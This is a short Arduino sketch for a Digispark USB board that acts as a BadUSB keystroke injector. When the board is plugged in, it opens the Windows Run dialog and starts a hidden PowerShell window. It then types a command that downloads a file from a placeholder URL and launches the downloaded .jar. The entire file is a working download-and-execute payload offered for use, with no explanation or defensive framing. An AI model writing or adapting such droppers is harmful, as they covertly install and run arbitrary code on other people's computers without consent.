#define kbd_es_es
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.update();
  DigiKeyboard.delay(5000);
}

void loop() {
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  delay(2000);
  DigiKeyboard.println("powershell -windowstyle hidden");
  delay(4000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(5000);
  DigiKeyboard.println("$source = \"File URL \"; $destination = \"Path\\FileName\"; Invoke-WebRequest $source -OutFile $destination;");
  delay(2000);
  DigiKeyboard.println("start-process FileName.jar");
  delay(2000);
  DigiKeyboard.println("exit");
  while(1);
}
